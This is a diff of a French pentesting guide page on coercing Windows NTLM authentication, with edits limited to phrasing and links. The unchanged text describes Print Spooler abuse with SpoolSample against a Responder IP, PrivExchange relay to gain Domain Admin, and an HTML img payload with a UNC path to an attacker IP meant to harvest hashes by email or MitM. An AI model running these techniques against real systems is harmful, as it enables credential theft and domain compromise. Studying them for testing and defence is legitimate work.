@@ -8,7 +8,7 @@
 
 ## Abus du service Spooler
 
-Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et lui dire simplement d'**envoyer la notification à un système**.\
+Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et lui dire simplement de **envoyer la notification à un système**.\
 Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte d'ordinateur** dans cette authentification.
 
 ### Trouver des serveurs Windows sur le domaine
@@ -28,9 +28,9 @@ Vous pouvez également utiliser rpcdump.py sur Linux et rechercher le protocole 
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Demandez au service de s'authentifier contre un hôte arbitraire
+### Demander au service de s'authentifier contre un hôte arbitraire
 
-Vous pouvez compiler[ **SpoolSample à partir d'ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Vous pouvez compiler[ **SpoolSample depuis ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -51,7 +51,7 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine ayant une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.
+L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine avec une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.
 
 Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a des **privilèges WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **transfert d'informations vers LDAP et ensuite extraire la base de données NTDS du domaine**. Dans les cas où le transfert vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour transférer et s'authentifier auprès d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'Administrateur de Domaine avec n'importe quel compte utilisateur de domaine authentifié.
 
@@ -88,13 +88,13 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
 ## Injection HTML
 
-### Via email
+### Par email
 
 Si vous connaissez l'**adresse email** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **email avec une image 1x1** telle que
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-et quand il l'ouvre, il essaiera de s'authentifier.
+et lorsqu'il l'ouvre, il essaiera de s'authentifier.
 
 ### MitM
 
@@ -102,9 +102,9 @@ Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML 
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Cracking NTLMv1
+## Craquer NTLMv1
 
-Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les craquer](../ntlm/#ntlmv1-attack).\
+Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les craquer](../ntlm/index.html#ntlmv1-attack).\
 &#xNAN;_&#x52;emember que pour craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
